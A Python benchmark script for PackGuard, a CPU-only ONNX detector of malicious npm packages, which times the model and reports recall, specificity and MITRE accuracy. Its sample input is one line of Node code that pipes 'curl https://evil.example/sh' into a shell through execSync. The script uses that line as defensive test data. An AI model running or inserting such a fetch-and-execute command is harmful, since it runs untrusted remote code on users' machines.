"""
PackGuard Stage 2 v4 — Real-Life v6 + T1-T8 Obfuscation Benchmark (100% CPU-Only)
Evaluates Stage 2 v4 (`PackGuard-v4-Nano-CPU-INT8`, 11.83 MB) on:
  1. Direct ONNX Runtime `CPUExecutionProvider` hardware verification (Zero GPU).
  2. Built-in T1-T8 Obfuscation & 4-Head MITRE ATT&CK Suite.
  3. All 20 Real-Life Stage 1 False Alarms + T1-T4 npm Corpus (`experiments/v6/`).
"""

import json
import os
import sys
import time
from pathlib import Path

# Strictly enforce CPU-only execution (disable all CUDA/GPU devices)
os.environ["CUDA_VISIBLE_DEVICES"] = ""

V4_DIR = Path(__file__).resolve().parent
REPO_ROOT = V4_DIR.parent.parent if (V4_DIR.parent.parent / "experiments").exists() else Path("/home/USER/PackGuard")
if str(V4_DIR) not in sys.path:
    sys.path.insert(0, str(V4_DIR))

from eval_v4_benchmark import run_benchmark as run_t1_t8_suite
from stage2_filter import PackGuardStage2v4Filter, fast_cpu_tokenize


def benchmark_raw_onnx_cpu() -> None:
    onnx_candidates = [
        V4_DIR / "checkpoints" / "packguard_v4_nano_int8.onnx",
        Path("/home/USER/packguard_v4/v4/checkpoints/packguard_v4_nano_int8.onnx"),
    ]
    onnx_path = next((p for p in onnx_candidates if p.exists()), None)
    if onnx_path is None:
        return
    try:
        import numpy as np
        import onnxruntime as ort

        sess_opts = ort.SessionOptions()
        sess_opts.intra_op_num_threads = 4
        sess_opts.graph_optimization_level = ort.GraphOptimizationLevel.ORT_ENABLE_ALL
        sess = ort.InferenceSession(
            str(onnx_path),
            sess_options=sess_opts,
            providers=["CPUExecutionProvider"],
        )
        ids, mask = fast_cpu_tokenize(
            "const cp = require('child_process'); cp.execSync('curl https://evil.example/sh | sh');",
            max_len=256,
        )
        np_ids = np.array([ids], dtype=np.int64)
        np_mask = np.array([mask], dtype=np.int64)

        for _ in range(5):
            _ = sess.run(None, {"input_ids": np_ids, "attention_mask": np_mask})

        t0 = time.perf_counter()
        iters = 50
        for _ in range(iters):
            outputs = sess.run(None, {"input_ids": np_ids, "attention_mask": np_mask})
        avg_ms = ((time.perf_counter() - t0) / iters) * 1000.0
        size_mb = onnx_path.stat().st_size / (1024 * 1024)
        print(
            f"\n=== 0. DIRECT ONNX RUNTIME CPU-ONLY HARDWARE VERIFICATION ===\n"
            f"  ONNX File        : {onnx_path.name} ({size_mb:.2f} MB)\n"
            f"  Active Providers : {sess.get_providers()} (GPU Disabled)\n"
            f"  Output Tensors   : binary_logits={outputs[0].shape}, mitre_logits={outputs[1].shape}\n"
            f"  Pure Neural Pass : {avg_ms:.2f} ms / package on CPU"
        )
    except Exception as e:
        print(f"  [ONNX Runtime Direct Info]: {e}")


def main() -> None:
    print("=====================================================================")
    print("  PackGuard Stage 2 v4 — 100% CPU-Only Real-Life Benchmark Suite")
    print("=====================================================================")

    s2 = PackGuardStage2v4Filter(
        model_dir=V4_DIR / "checkpoints",
        threshold=0.62,
        threads=4,
    )
    print(f"[+] Active Model : {s2.active_model_name} ({s2.active_model_size_mb} MB)")
    print(f"[+] Target Device: {s2.device} (CUDA_VISIBLE_DEVICES={os.environ.get('CUDA_VISIBLE_DEVICES')!r})")

    benchmark_raw_onnx_cpu()

    # 1. Run built-in T1-T8 + Benign Hard-Negative CPU Benchmark
    t0 = time.perf_counter()
    v4_suite = run_t1_t8_suite()
    suite_ms = round((time.perf_counter() - t0) * 1000.0, 2)
    print(
        f"\n=== 1. T1-T8 MULTI-TIER & FALSE-ALARM SUITE (CPU-ONLY) ===\n"
        f"  Benign Specificity : {v4_suite['false_alarm_elimination_rate']:.2f}% (FPR: {v4_suite['combined_fpr_pct']:.2f}%)\n"
        f"  Malicious Recall   : {v4_suite['malicious_recall_pct']:.2f}%\n"
        f"  MITRE Head Acc     : {v4_suite['mitre_head_accuracy_pct']:.2f}%\n"
        f"  Mean CPU Latency   : {v4_suite['avg_latency_ms']:.2f} ms / package (Total: {suite_ms:.2f} ms)"
    )

    # 2. If running on server with `/home/USER/PackGuard/stage 2 LLM Model/v3/eval_v6_real_benchmark.py`,
    #    run the full 20-False-Alarm + 1,400-package T1-T4 v6 benchmark on CPU-Only using v4!
    v3_dir = Path("/home/USER/PackGuard/stage 2 LLM Model/v3")
    if (v3_dir / "eval_v6_real_benchmark.py").exists():
        print("\n=== 2. FULL REAL-LIFE v6 CORPUS (20 FALSE ALARMS + T1-T4 NPM PACKAGES ON CPU) ===")
        sys.path.insert(0, str(v3_dir))
        import eval_v6_real_benchmark as v6_bench

        # Monkeypatch v6_bench.PackGuardStage2Model to use our v4 CPU-Only model!
        v6_bench.PackGuardStage2Model = lambda **kw: s2
        t_v6 = time.perf_counter()
        v6_bench.main()
        v6_sec = time.perf_counter() - t_v6
        print(f"\n[+] Full Real-Life v6 Benchmark Completed on CPU-ONLY in {v6_sec:.2f} seconds!")

    print("\n[+] CPU-Only Benchmark Verification Complete!")


if __name__ == "__main__":
    main()
